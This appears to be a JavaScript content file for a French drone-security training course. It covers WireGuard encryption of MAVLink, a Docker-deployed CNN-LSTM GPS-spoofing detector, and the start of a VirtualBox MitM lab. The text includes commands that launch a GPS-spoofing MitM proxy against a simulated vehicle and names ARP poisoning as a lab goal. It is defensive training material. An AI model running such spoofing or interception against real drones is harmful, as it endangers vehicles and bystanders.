/* ============================================================
   MODULE 05 — PRÉVENTION, WIREGUARD & IA DOCKER
   ============================================================ */
{
  id:"prevention", num:"05",
  navName:{fr:"Prévention"},
  eyebrow:{fr:"Partie 05 — Prévention & Déploiement"},
  heading:{fr:"Chiffrer et détecter"},
  intro:{fr:"Ce module couvre le déploiement pratique d'un tunnel WireGuard observé sous Wireshark, puis le déploiement du détecteur IA directement dans un conteneur Docker."},
  title:{fr:"WireGuard et détection IA"},
  tag:{fr:"Module 05 · Défense"},
  level:{fr:"Avancé"}, duration:{fr:"1 h"}, prereq:{fr:"Module 04 validé"},
  subs:[
    {a:"prev-theorie",   t:{fr:"Théorie"}},
    {a:"prev-wireguard", t:{fr:"1 · WireGuard"}},
    {a:"prev-ai-docker", t:{fr:"2 · IA dans Docker"}}
  ],
  blocks:[

    /* ── Théorie ── */
    {t:"html", tx:{fr:'<div id="anchor-prev-theorie"></div>'}},
    {t:"h", tx:{fr:"Théorie — Pourquoi chiffrer et détecter ?"}},
    {t:"p", tx:{fr:"Les modules précédents ont montré qu'un attaquant sur le réseau peut lire la télémétrie MAVLink en clair et injecter des commandes arbitraires (DISARM, TAKEOFF) sans aucune authentification. Deux familles de contre-mesures répondent à ces menaces."}},

    {t:"h2", tx:{fr:"1. Chiffrement du canal de communication"}},
    {t:"p", tx:{fr:"MAVLink ne chiffre pas le contenu des messages. N'importe qui capable de capturer le trafic UDP entre la GCS et le drone peut lire la position GPS, l'altitude, l'état des moteurs, et rejouer ou modifier des commandes. Un tunnel VPN encapsule le flux MAVLink dans des paquets chiffrés : l'attaquant ne voit plus que du bruit aléatoire sur le réseau."}},
    {t:"p", tx:{fr:"<strong>WireGuard</strong> est le protocole retenu ici : moderne, rapide, et minimal (environ 4 000 lignes de code contre plusieurs centaines de milliers pour OpenVPN ou IPsec). Il utilise <strong>Curve25519</strong> pour l'échange de clés et <strong>ChaCha20-Poly1305</strong> pour le chiffrement authentifié. Le handshake dure moins de 100 ms et le tunnel est transparent pour les applications SITL et QGC n'ont pas besoin d'être modifiés."}},
    {t:"alert", kind:"warn", title:{fr:"Chiffrement ≠ solution complète"},
      body:{fr:"Un tunnel WireGuard protège contre le sniffing et l'injection externe, mais un attaquant <strong>déjà dans le tunnel</strong> (clé compromise, endpoint piraté) peut toujours envoyer des commandes valides. Le chiffrement ne remplace pas l'authentification des commandes ni la surveillance comportementale."}},

    {t:"h2", tx:{fr:"2. Détection par intelligence artificielle"}},
    {t:"p", tx:{fr:"Certaines attaques ne modifient aucun paramètre de sécurité et restent sous tous les seuils fixes : un <strong>drift GPS progressif</strong> déplace le drone de quelques mètres par seconde, imperceptible pour un humain ou un système à règles, mais détectable statistiquement. Un modèle d'apprentissage automatique entraîné sur le comportement normal du drone apprend les dynamiques physiques attendues (position, vitesse, orientation, vibrations) et signale tout écart anormal, même lent et graduel."}},
    {t:"p", tx:{fr:"Le modèle utilisé dans ce module est un réseau <strong>CNN-LSTM</strong> : les couches convolutives extraient des motifs locaux dans les séquences de télémétrie, les couches LSTM mémorisent les dépendances temporelles longues. Il est entraîné sur 23 features GNSS issues de logs ArduPilot réels et atteint une accuracy de 0.82 et un F1-score de 0.75. Il est déployé dans un conteneur Docker isolé pour éviter toute instafllation locale."}},

    /* ── 1 WireGuard + Wireshark ── */
    {t:"html", tx:{fr:'<div id="anchor-prev-wireguard"></div>'}},
    {t:"h", num:"01", tx:{fr:"Tunnel chiffré WireGuard — déploiement & observation Wireshark"}},
    {t:"prev", tag:{fr:"Chiffrement"}, title:{fr:"Encapsuler MAVLink dans un VPN"},
      body:{fr:"QGroundControl tourne sur <strong>Windows</strong> et SITL dans <strong>WSL 2</strong>. Sans protection, le MAVLink circule en clair sur le pont réseau entre les deux, lisible dans Wireshark. WireGuard crée un tunnel chiffré : SITL envoie son trafic vers l'IP tunnel de Windows (<code>10.0.0.2</code>), les paquets traversent le tunnel chiffré, et QGC les reçoit. Sur le pont physique, Wireshark ne voit plus que du chiffré."}},

    {t:"h2", tx:{fr:"Étape 1 — Installer WireGuard"}},
    {t:"alert", os:"windows", kind:"info", title:{fr:"Windows — Installer WireGuard"},
      body:{fr:"<ol><li>Télécharger l'installeur : <a href='https://download.wireguard.com/windows-client/wireguard-installer.exe' target='_blank' style='color:var(--accent)'>wireguard-installer.exe</a></li><li>Lancer le fichier téléchargé</li><li>Ouvrir WireGuard : <strong>Menu Démarrer → WireGuard</strong></li><li>L'application affiche une liste vide : aucun tunnel configuré pour l'instant, c'est normal</li></ol>"}},
    {t:"cmd", step:"1.1", name:{fr:"WSL — Installer WireGuard userspace"},
      cmd:"sudo apt update && sudo apt install wireguard wireguard-tools wireguard-go -y",
      exp:{fr:"Le noyau WSL 2 ne supporte pas WireGuard natif, <code>wireguard-go</code> est la version userspace qui fonctionne dans cet environnement."}},

    {t:"h2", tx:{fr:"Étape 2 — Générer les clés"}},
    {t:"cmd", step:"1.2", name:{fr:"Générer les clés Drone et GCS (dans WSL)"},
      cmd:"cd ~/Attaques && wg genkey | tee drone_priv.key | wg pubkey > drone_pub.key && wg genkey | tee gcs_priv.key | wg pubkey > gcs_pub.key && echo '=== Drone ===' && echo 'Privée :' && cat drone_priv.key && echo 'Publique :' && cat drone_pub.key && echo '=== GCS ===' && echo 'Privée :' && cat gcs_priv.key && echo 'Publique :' && cat gcs_pub.key",
      exp:{fr:"Génère deux paires de clés : une pour le Drone et une pour la GCS ."}},

    {t:"h2", tx:{fr:"Étape 3 — Créer les configurations WireGuard"}},
    {t:"cmd", step:"1.3", name:{fr:"WSL — Créer wg0.conf (côté Drone)"},
      cmd:"cd ~/Attaques && DRONE_PRIV=$(cat drone_priv.key) && GCS_PUB=$(cat gcs_pub.key) && sudo tee /etc/wireguard/wg0.conf > /dev/null << EOF\n[Interface]\nPrivateKey = $DRONE_PRIV\nAddress = 10.0.0.1/24\nListenPort = 51820\n\n[Peer]\nPublicKey = $GCS_PUB\nAllowedIPs = 10.0.0.2/32\nEndpoint = 127.0.0.1:51821\nEOF\necho \"wg0.conf créé — endpoint Windows : 127.0.0.1\"",
      exp:{fr:"Le Drone (WSL) prend l'IP tunnel <code>10.0.0.1</code>. L'endpoint du peer GCS pointe vers l'IP Windows (<code>172.x.x.1</code>) sur le port <code>51821</code> où WireGuard Windows écoutera."}},
    {t:"cmd", step:"1.4", name:{fr:"Créer wg1.conf (côté GCS/QGC)"},
      cmd:"cd ~/Attaques && GCS_PRIV=$(cat gcs_priv.key) && DRONE_PUB=$(cat drone_pub.key) && sudo tee /etc/wireguard/wg1.conf > /dev/null << 'EOF'\n[Interface]\nPrivateKey = $GCS_PRIV\nAddress = 10.0.0.2/24\nListenPort = 51821\n\n[Peer]\nPublicKey = $DRONE_PUB\nAllowedIPs = 10.0.0.1/32\nEndpoint = 127.0.0.1:51820\nEOF",
      exp:{fr:"La GCS (QGC) prend l'IP tunnel <code>10.0.0.2</code>. L'endpoint pointe vers <code>127.0.0.1:51820</code> — le port d'écoute de <code>wg0</code> sur la même machine. Les deux interfaces communiquent via la loopback."}},

    {t:"h2", tx:{fr:"Étape 4 — Activer les tunnels"}},
    {t:"cmd", step:"1.5", name:{fr:"WSL — Monter le tunnel wg0"},
      cmd:"sudo wg-quick up wg0 && sudo ip route add 10.0.0.2/32 dev wg0 2>/dev/null; echo 'wg0 actif'",
      exp:{fr:"Crée l'interface <code>wg0</code> avec l'IP <code>10.0.0.1</code>. La deuxième commande ajoute la route vers Windows si <code>wg-quick</code> ne l'a pas créée (cas fréquent avec <code>wireguard-go</code> sous WSL."}},
    {t:"alert", os:"windows", kind:"info", title:{fr:"Windows — Importer et activer wg1.conf"},
      body:{fr:"<ol><li>Ouvrir <strong>WireGuard</strong> (Menu Démarrer)</li><li>Cliquer <strong>Import tunnel(s) from file</strong></li><li>Sélectionner <code>Downloads\\wg1.conf</code></li><li>Cliquer <strong>Activate</strong></li></ol>Le tunnel passe en vert : l'IP <code>10.0.0.2</code> est assignée à Windows."}},


    {t:"h2", tx:{fr:"Étape 5 — Lancer SITL via le tunnel"}},
    {t:"cmd", step:"1.6", name:{fr:"WSL — Bloquer le port 14550 sur eth0 (forcer le tunnel)"},
      cmd:"sudo iptables -F && sudo iptables -I OUTPUT -o eth0 -p udp --dport 14550 -j DROP && sudo iptables -I OUTPUT -o eth0 -p udp --sport 14550 -j DROP && sudo iptables -I INPUT -i eth0 -p udp --dport 14550 -j DROP && echo 'Port 14550 bloqué sur eth0'",
      exp:{fr:"Ces règles ferment ce chemin direct, seul le port <code>51820</code> (WireGuard chiffré) reste actif sur eth0."}},
    
    {t:"cmd", step:"1.7", name:{fr:"WSL — Lancer SITL via le tunnel"},
      cmd:"sim_vehicle.py -v ArduCopter -L IMTATLANTIQUE --console --map --out=udp:10.0.0.2:14550",
      exp:{fr:"SITL envoie le MAVLink vers <code>10.0.0.2:14550</code> (IP tunnel Windows). Les paquets traversent wg0, sont chiffrés sur eth0, et WireGuard Windows les déchiffre pour QGC."}},

    {t:"alert", kind:"info", title:{fr:"Remarque — ce que vous observez est normal"},
      body:{fr:"Le trafic de télémétrie drone (SITL→QGC) passe intégralement dans le tunnel WireGuard chiffré. Seuls les battements de cœur de contrôle (QGC→SITL) restent visibles sur eth0, car ils transitent par l'interface Hyper-V qui échappe aux règles iptables de WSL."}},

    {t:"h2", tx:{fr:"Étape 7 — Nettoyer"}},
    {t:"cmd", step:"1.8", name:{fr:"WSL — Arrêter le tunnel"},
      cmd:"sudo wg-quick down wg0",
      exp:{fr:"Désactive l'interface wg0 côté WSL."}},
    {t:"cmd", step:"1.9", name:{fr:"WSL — Supprimer les règles iptables"},
      cmd:"sudo iptables -F && sudo iptables -P INPUT ACCEPT && sudo iptables -P OUTPUT ACCEPT && echo 'iptables réinitialisé'",
      exp:{fr:"Vide toutes les règles iptables (<code>-F</code>) et restaure les politiques par défaut (ACCEPT). Le port <code>14550</code> sur eth0 est de nouveau accessible, le chemin direct WSL↔Windows fonctionne à nouveau."}},
    {t:"cmd", step:"1.10", name:{fr:"WSL — Relancer SITL sans tunnel (chemin direct)"},
      cmd:"sim_vehicle.py -v ArduCopter -L IMTATLANTIQUE --console --map --out=udp:127.0.0.1:14550",
      exp:{fr:"SITL envoie le MAVLink directement à l'IP Windows (<code>127.0.0.1</code>) via eth0, sans chiffrement. Wireshark sur <code>vEthernet (WSL)</code> affiche de nouveau les paquets MAVLink en clair."}},
    {t:"alert", os:"windows", kind:"info", title:{fr:"Windows — Désactiver le tunnel WireGuard"},
      body:{fr:"<ol><li>Ouvrir <strong>WireGuard</strong> (Menu Démarrer)</li><li>Sélectionner le tunnel <strong>wg1</strong></li><li>Cliquer <strong>Deactivate</strong></li></ol>"}},

    /* ── 2 IA dans Docker ── */
    {t:"html", tx:{fr:'<div id="anchor-prev-ai-docker"></div>'}},
    {t:"h", num:"02", tx:{fr:"Détection IA déployée dans Docker"}},
    {t:"prev", tag:{fr:"Détection"}, title:{fr:"Modèle CNN-LSTM en conteneur"},
      body:{fr:"Les attaques furtives (drift GPS) ne modifient aucun paramètre et conservent un GPS « authentique » : les règles fixes ne les voient pas. Un modèle CNN-LSTM entraîné apprend leur signature statistique. Il est déployé dans un conteneur Docker isolé : SITL, QGC, détecteur et attaque tournent ensemble sans installation locale."}},
    {t:"cards", cols:"160px", items:[
      {tt:"0.82", bd:{fr:"Accuracy"}},
      {tt:"0.75", bd:{fr:"F1-score"}},
      {tt:"0.39", bd:{fr:"Loss (validation)"}},
      {tt:"23", bd:{fr:"Features GNSS"}}
    ]},
    {t:"table",
      head:[{fr:"Catégorie"},{fr:"Features"},{fr:"Description"}],
      rows:[
        [{fr:"Navigation"},"<code>lat, lon, alt, alt_ellipsoid</code>",{fr:"Position absolue"}],
        [{fr:"Précision GPS"},"<code>eph, epv, hdop, vdop</code>",{fr:"Erreurs horizontale/verticale"}],
        [{fr:"Qualité signal"},"<code>s_variance, c_variance, sats_used</code>",{fr:"Variances EKF, satellites"}],
        [{fr:"Cinématique"},"<code>vel, vel_n/e/d, cog</code>",{fr:"Vitesses NED + cap"}],
        [{fr:"Dérivées"},"<code>d_lat, d_lon, d_alt, vel_from_pos</code>",{fr:"Variations inter-trames"}],
        [{fr:"Anomalies"},"<code>vel_consistency, noise_per_sat, hdop_eph</code>",{fr:"Incohérences révélatrices"}]
      ]},

    {t:"h2", tx:{fr:"Étape 0 — Installer Docker"}},
    {t:"alert", os:"windows", kind:"warn", title:{fr:"Windows — Installer Docker Desktop (si absent)"},
      body:{fr:'Si la commande <code>docker</code> n\'est pas reconnue dans PowerShell, Docker Desktop n\'est pas installé.<ol><li>Télécharger : <a href="https://www.docker.com/products/docker-desktop/" target="_blank" style="color:var(--accent)">docker.com/products/docker-desktop</a></li><li>Lancer l\'installeur → choisir <strong>Use WSL 2 instead of Hyper-V</strong></li><li>Redémarrer Windows</li><li>Ouvrir Docker Desktop et attendre l\'icône baleine active dans la barre des tâches</li><li>Vérifier dans PowerShell : <code>docker version</code></li></ol>'}},
    {t:"alert", os:"linux", kind:"warn", title:{fr:"Ubuntu — Installer Docker Engine (si absent)"},
      body:{fr:'Si la commande <code>docker</code> n\'est pas reconnue, installez Docker Engine :<pre style="margin:8px 0 0;font-size:12px">sudo apt update && sudo apt install -y docker.io\nsudo usermod -aG docker $USER\nnewgrp docker</pre>Vérifiez avec <code>docker version</code>. Si la version est trop ancienne, suivez la doc officielle : <a href="https://docs.docker.com/engine/install/ubuntu/" target="_blank" style="color:var(--accent)">docs.docker.com/engine/install/ubuntu</a>'}},

    {t:"h2", tx:{fr:"Étape 1 — Charger et démarrer le conteneur"}},
    {t:"alert", kind:"info", title:{fr:"Image pré-construite"},
      body:{fr:'L\'image Docker (~3,8 Go) contient ArduPilot SITL, Gazebo Harmonic, QGroundControl, le détecteur IA et les scripts d\'attaque. Téléchargez <code>drone-lab.tar.gz</code> depuis <a href="https://drive.google.com/file/d/1Ty449ceEVfNMsnvy6JP09FixDeeD9nuT/view" target="_blank" rel="noopener">Google Drive</a>.'}},
    {t:"alert", os:"windows", kind:"warn", title:{fr:"WSL 2 requis pour Docker Desktop"},
      body:{fr:"Docker Desktop sur Windows s'appuie sur WSL 2. Vérifiez avec <code>wsl --status</code> que WSL 2 est actif avant de lancer Docker Desktop."}},
    {t:"cmd", os:"windows", pfx:"PS> ", step:"6.1", name:{fr:"Charger l'image"},
      cmd:"docker load -i C:\\Users\\$env:USERNAME\\Downloads\\drone-lab.tar.gz",
      exp:{fr:"Importe l'image depuis le dossier Téléchargements. Le chargement prend ~2 min selon le disque."}},
    {t:"cmd", os:"linux", step:"6.1", name:{fr:"Charger l'image"},
      cmd:"docker load -i ~/Downloads/drone-lab.tar.gz",
      exp:{fr:"Importe l'image depuis le dossier Téléchargements. Le chargement prend ~2 min selon le disque."}},
    {t:"cmd", os:"windows", pfx:"PS> ", step:"6.2", name:{fr:"Lancer le conteneur"},
      cmd:"docker run -d --name drone-lab --privileged -p 6080:6080 -p 5900:5900 -p 14550:14550/udp -p 14553:14553/udp drone-lab",
      exp:{fr:"Port <code>6080</code> → noVNC (navigateur). Port <code>5900</code> → VNC natif. Port <code>14550</code> → QGC. Port <code>14553</code> → détecteur IA."}},
    {t:"cmd", os:"linux", step:"6.2", name:{fr:"Lancer le conteneur"},
      cmd:"docker run -d --name drone-lab --privileged -p 6080:6080 -p 5900:5900 -p 14550:14550/udp -p 14553:14553/udp drone-lab",
      exp:{fr:"Port <code>6080</code> → noVNC (navigateur). Port <code>5900</code> → VNC natif. Port <code>14550</code> → QGC. Port <code>14553</code> → détecteur IA."}},
    {t:"cmd", os:"windows", pfx:"PS> ", step:"6.3", name:{fr:"Ouvrir le bureau graphique"},
      cmd:"start http://localhost:6080/vnc.html",
      exp:{fr:"Ouvre noVNC dans le navigateur. Cliquez sur <em>Connect</em> (aucun mot de passe). Vous avez accès au bureau Ubuntu du conteneur."}},
    {t:"cmd", os:"linux", step:"6.3", name:{fr:"Ouvrir le bureau graphique"},
      cmd:"xdg-open http://localhost:6080/vnc.html",
      exp:{fr:"Ouvre noVNC dans le navigateur par défaut. Cliquez sur <em>Connect</em> (aucun mot de passe). Vous avez accès au bureau Ubuntu du conteneur."}},

    {t:"h2", tx:{fr:"Les scripts"}},
    {t:"html", tx:{fr:`<div style="display:flex;flex-direction:column;gap:10px;margin:10px 0">
  <div style="display:flex;align-items:center;gap:12px;padding:14px 18px;background:var(--panel2);border:1px solid var(--line);border-radius:var(--r)">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="20" height="20" style="color:var(--teal);flex-shrink:0"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
    <div style="flex:1">
      <strong>attaque.py</strong><br>
      <span style="font-size:13px;color:var(--ink-dim)">Proxy MitM GPS — reçoit les vraies trames SITL, les falsifie (drift / jump / circle / replay / sat_drop / velocity_spoof) et les forwarde vers le détecteur. Mode <code>--mode-both</code> : déplace aussi le drone physiquement.</span>
    </div>
    <a href="scripts/attaque.py" download="attaque.py" class="copy-btn" style="text-decoration:none;flex-shrink:0"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="12" height="12"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Télécharger</a>
  </div>
  <div style="display:flex;align-items:center;gap:12px;padding:14px 18px;background:var(--panel2);border:1px solid var(--line);border-radius:var(--r)">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="20" height="20" style="color:var(--teal);flex-shrink:0"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
    <div style="flex:1">
      <strong>detect.py</strong><br>
      <span style="font-size:13px;color:var(--ink-dim)">Détecteur CNN-LSTM — écoute le flux GPS forwardé par attaque.py, extrait 23 features (vel_consistency, noise_per_sat, hdop_eph…) et classifie chaque fenêtre de 30 trames en ✓ CLEAN ou ⚠ SPOOFED.</span>
    </div>
    <a href="scripts/detect.py" download="detect.py" class="copy-btn" style="text-decoration:none;flex-shrink:0"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="12" height="12"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Télécharger</a>
  </div>
</div>`}},

    {t:"h2", tx:{fr:"Étape 2 — Copier les scripts dans le conteneur"}},
    {t:"cmd", os:"windows", pfx:"PS> ", name:{fr:"Copier attaque.py"},
      cmd:'docker cp "C:\\Users\\$env:USERNAME\\Downloads\\attaque.py" drone-lab:/home/drone/attacks/attaque.py',
      exp:{fr:"Copie le script d'attaque depuis votre dossier Téléchargements vers le conteneur."}},
    {t:"cmd", os:"linux", name:{fr:"Copier attaque.py"},
      cmd:"docker cp ~/Downloads/attaque.py drone-lab:/home/drone/attacks/attaque.py",
      exp:{fr:"Copie le script d'attaque depuis votre dossier Téléchargements vers le conteneur."}},
    {t:"cmd", os:"windows", pfx:"PS> ", name:{fr:"Copier detect.py"},
      cmd:'docker cp "C:\\Users\\$env:USERNAME\\Downloads\\detect.py" drone-lab:/home/drone/attacks/detect.py',
      exp:{fr:"Copie le détecteur IA depuis le dossier drone_docker vers le conteneur."}},
    {t:"cmd", os:"linux", name:{fr:"Copier detect.py"},
      cmd:"docker cp ~/Downloads/detect.py drone-lab:/home/drone/attacks/detect.py",
      exp:{fr:"Copie le détecteur IA depuis le dossier drone_docker vers le conteneur."}},

    {t:"h2", tx:{fr:"Étape 3 — Lancer la chaîne complète"}},
    {t:"p", tx:{fr:"Dans le bureau noVNC, 4 terminaux en parallèle :"}},
    {t:"cmd", step:"T1", name:{fr:"Terminal 1 — Simulation Gazebo + SITL"},
      cmd:"~/scripts/start_sim.sh",
      exp:{fr:"Démarre Gazebo Harmonic + ArduRover SITL (~35 s). Attendez que la console MAVProxy affiche les heartbeats."}},
    {t:"cmd", pfx:"> ", step:"T1", name:{fr:"Configuration MAVProxy"},
      cmd:"param set FRAME_CLASS 2\nparam set SIM_WAVE_ENABLE 1\nmode GUIDED\narm throttle force",
      exp:{fr:"Configure le bateau, active les vagues, passe en GUIDED et arme le véhicule."}},
    {t:"cmd", pfx:"> ", step:"T1", name:{fr:"Ajouter la sortie vers attaque.py (port 14552)"},
      cmd:"output add udp:127.0.0.1:14552",
      exp:{fr:"MAVProxy envoie le flux MAVLink à <code>attaque.py</code> sur le port <code>14552</code>. Le détecteur (<code>14553</code>) ne reçoit rien directement de SITL — il ne reçoit que ce que <code>attaque.py</code> lui forwarde, c'est-à-dire le GPS <strong>falsifié</strong>."}},
    {t:"cmd", step:"T2", name:{fr:"Terminal 2 — QGroundControl"},
      cmd:"~/scripts/start_qgc.sh",
      exp:{fr:"Lance la station au sol. Vérifiez que le véhicule apparaît sur la carte."}},
    {t:"cmd", step:"T3", name:{fr:"Terminal 3 — Détecteur IA (CNN-LSTM)"},
      cmd:"python3 detect.py --connection udp:0.0.0.0:14553 --model-dir model",
      exp:{fr:"Le modèle CNN-LSTM classifie chaque trame : il affiche CLEAN ou SPOOFED."}},
    {t:"cmd", step:"T4", name:{fr:"Terminal 4 — Attaque drift (proxy MitM)"},
      cmd:"python3 ~/attacks/attaque.py --mode-both --connection udp:0.0.0.0:14552 --forward-host 127.0.0.1 --forward-port 14553 --attack drift --drift-rate 1.5 --pre-attack-delay 5",
      exp:{fr:"Reçoit le GPS réel de SITL sur <code>14552</code>, calcule les coordonnées falsifiées (dérive à 1,5 m/s), et forwarde le GPS <em>modifié</em> vers <code>detect.py</code> sur <code>14553</code>."}},
    {t:"result", label:{fr:"Détection en action"}, src:"images/detect.png",
      cap:{fr:"Scénario complet dans le conteneur : le détecteur CNN-LSTM signale l'attaque par dérive."}},

    {t:"h2", tx:{fr:"Commandes Docker utiles"}},
    {t:"cmd", name:{fr:"Ouvrir un shell dans le conteneur"},
      cmd:"docker exec -it drone-lab bash",
      exp:{fr:"Entre dans le conteneur en cours d'exécution pour inspecter ou modifier les fichiers."}},
    {t:"cmd", name:{fr:"Suivre les logs"},
      cmd:"docker logs -f drone-lab",
      exp:{fr:"Affiche en continu la sortie du conteneur — utile pour diagnostiquer un démarrage qui échoue."}},
    {t:"cmd", name:{fr:"Arrêter puis redémarrer"},
      cmd:"docker stop drone-lab && docker start drone-lab",
      exp:{fr:"Met le conteneur en pause puis le relance sans perdre son état interne."}},
    {t:"cmd", name:{fr:"Tout nettoyer"},
      cmd:"docker rm -f drone-lab && docker rmi drone-lab && docker system prune -af --volumes",
      exp:{fr:"Supprime le conteneur, l'image et le cache. À utiliser pour repartir d'un environnement propre."}},
    {t:"alert", kind:"info", title:{fr:"Code source & modèles"},
      body:{fr:'Disponibles sur <a href="https://github.com/yakine-haffoudhi/UAV-USV_Security" target="_blank" rel="noopener">github.com/yakine-haffoudhi/UAV-USV_Security</a>.'}}

  ],
  quiz:[
    {q:{fr:"La signature MAVLink v2 protège-t-elle contre le sniffing ?"},
     a:{fr:"Non. Elle <b>authentifie</b> (anti-injection, anti-rejeu) mais ne <b>chiffre pas</b>. Il faut combiner la signature avec un tunnel WireGuard pour rendre la télémétrie illisible."}},
    {q:{fr:"Sur quel port UDP WireGuard chiffre-t-il le trafic MAVLink, et que voit-on dans Wireshark sur ce port ?"},
     a:{fr:"WireGuard utilise le port <code>51820</code> par défaut. Dans Wireshark, on ne voit que des paquets de type <em>Handshake Initiation</em> et <em>Transport Data</em> au payload aléatoire — MAVLink est complètement invisible."}},
    {q:{fr:"Pourquoi la détection IA est-elle nécessaire en complément des règles fixes ?"},
     a:{fr:"L'attaque par <b>dérive GPS (SET_POSITION_TARGET_GLOBAL_INT)</b> conserve un GPS authentique et ne change aucun paramètre : les seuils EKF ne la détectent pas. Le modèle CNN-LSTM apprend sa signature statistique sur 23 features GNSS et la repère."}}
  ],
  flag:"FLAG{WIREGUARD-CNN-SECURED}"
},

/* ============================================================
   MODULE 06 — BONUS : VirtualBox & MITM Complet
   ============================================================ */
{
  id:"bonus", num:"06",
  navName:{fr:"Bonus — VirtualBox & MITM"},
  eyebrow:{fr:"Bonus — Laboratoire réseau complet"},
  heading:{fr:"VirtualBox et MITM sur réseau isolé"},
  intro:{fr:"Ce module bonus guide l'installation de VirtualBox et la création d'un laboratoire réseau isolé à trois machines virtuelles. L'attaque Man-in-the-Middle est ensuite réalisée sur ce réseau : la technique la plus puissante pour intercepter et modifier le trafic MAVLink entre un drone et sa station de contrôle."},
  title:{fr:"Installer VirtualBox et exécuter un MITM complet"},
  tag:{fr:"Bonus · Expert"},
  level:{fr:"Expert"}, duration:{fr:"1 h 30"}, prereq:{fr:"Module 03 validé"},
  goals:[
    {fr:"Installer VirtualBox et créer un réseau Host-Only isolé"},
    {fr:"Déployer 3 VMs : ArduPilot, QGroundControl, Kali Linux"},
    {fr:"Réaliser un ARP poisoning complet entre les VMs"},
    {fr:"Intercepter et décoder le trafic MAVLink en transit"}
  ],
  subs:[
    {a:"vbox-install", t:{fr:"1 · Installer VirtualBox"}},
    {a:"vbox-network", t:{fr:"2 · Réseau Host-Only"}},
    {a:"vbox-vms",     t:{fr:"3 · Créer les 3 VMs"}},
    {a:"mitm-full",    t:{fr:"4 · MITM complet"}}
  ],
  blocks:[

    /* ---- VirtualBox Install ---- */
    {t:"html", tx:{fr:'<div id="anchor-vbox-install"></div>'}},
    {t:"h", num:"01", tx:{fr:"Installer VirtualBox"}},
    {t:"p", tx:{fr:"VirtualBox (Oracle, gratuit et open-source) permet de faire tourner plusieurs systèmes d'exploitation en parallèle sur un seul ordinateur. C'est le socle du laboratoire MITM à trois VMs."}},
    {t:"cards", items:[
      {tt:{fr:"Version requise"}, bd:{fr:"<strong>VirtualBox 7.x</strong> (dernière stable). Téléchargeable sur virtualbox.org → Downloads. Installez également le <em>Extension Pack</em> de même version : il ajoute USB 3.0, accélération vidéo et chiffrement des VMs."}},
      {tt:{fr:"Matériel minimum"}, bd:{fr:"RAM : <strong>8 Go</strong> minimum (4 Go pour les 3 VMs + OS hôte). Disque : <strong>60 Go</strong> libres. CPU : 4 cœurs avec virtualisation <strong>VT-x / AMD-V</strong> activée dans le BIOS/UEFI."}},
      {tt:{fr:"Systèmes hôtes"}, bd:{fr:"Windows 10/11, Ubuntu 22.04+, macOS 13+. Les étapes ci-dessous couvrent Windows et Linux Ubuntu."}}
    ]},

    {t:"h2", tx:{fr:"Installation sur Windows"}},
    {t:"cmd", os:"windows", pfx:"PS> ", step:"1.1w", name:{fr:"Installer via Winget (recommandé)"},
      cmd:"winget install Oracle.VirtualBox",
      exp:{fr:"Installe la dernière version stable avec ses pilotes réseau automatiquement. Redémarrez Windows après — les adaptateurs Host-Only apparaissent dans les connexions réseau Windows."}},
    {t:"alert", os:"windows", kind:"info", title:{fr:"Alternative — installeur graphique"},
      body:{fr:"Téléchargez le <code>.exe</code> depuis virtualbox.org → Downloads → Windows hosts. Exécutez-le et acceptez l'installation des pilotes réseau quand Windows le demande — ils créent les adaptateurs virtuels Host-Only."}},

    {t:"h2", tx:{fr:"Installation sur Linux (Ubuntu)"}},
    {t:"cmd", os:"linux", step:"1.1l", name:{fr:"Ajouter la clé GPG et le dépôt Oracle"},
      cmd:"wget -O- https://www.virtualbox.org/download/oracle_vbox_2016.asc | sudo gpg --dearmor -o /usr/share/keyrings/oracle-vbox.gpg\necho \"deb [arch=amd64 signed-by=/usr/share/keyrings/oracle-vbox.gpg] https://download.virtualbox.org/virtualbox/debian $(lsb_release -cs) contrib\" | sudo tee /etc/apt/sources.list.d/virtualbox.list",
      exp:{fr:"Ajoute le dépôt officiel Oracle avec sa clé GPG — permet les mises à jour automatiques via <code>apt</code>."}},
    {t:"cmd", os:"linux", step:"1.2l", name:{fr:"Installer VirtualBox 7"},
      cmd:"sudo apt update && sudo apt install -y virtualbox-7.0",
      exp:{fr:"Installe VirtualBox 7.x depuis le dépôt Oracle. Votre utilisateur est ajouté au groupe <code>vboxusers</code> — reconnectez-vous pour que ce changement soit actif."}},
    {t:"cmd", os:"linux", step:"1.3l", name:{fr:"Installer le Pack d'extensions"},
      cmd:"VER=$(vboxmanage --version | cut -d'r' -f1) && wget https://download.virtualbox.org/virtualbox/${VER}/Oracle_VM_VirtualBox_Extension_Pack-${VER}.vbox-extpack && sudo vboxmanage extpack install --replace Oracle_VM_VirtualBox_Extension_Pack-${VER}.vbox-extpack",
      exp:{fr:"Télécharge et installe automatiquement le pack correspondant à votre version de VirtualBox."}},

    /* ---- Host-Only Network ---- */
    {t:"html", tx:{fr:'<div id="anchor-vbox-network"></div>'}},
    {t:"h", num:"02", tx:{fr:"Créer le réseau Host-Only isolé"}},
    {t:"p", tx:{fr:"Un réseau <strong>Host-Only</strong> est un réseau virtuel fermé : les VMs communiquent entre elles et avec l'hôte, mais n'ont <em>pas</em> accès à Internet. Topologie parfaite pour simuler un réseau de contrôle de drone."}},
    {t:"cmd", step:"2.1", name:{fr:"Créer l'adaptateur Host-Only"},
      cmd:"vboxmanage hostonlyif create\nvboxmanage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0",
      exp:{fr:"Crée l'adaptateur Host-Only avec l'IP <code>192.168.56.1</code> pour l'hôte. Sous Windows, l'interface s'appelle <em>VirtualBox Host-Only Ethernet Adapter</em>."}},
    {t:"alert", kind:"info", title:{fr:"Via l'interface graphique VirtualBox"},
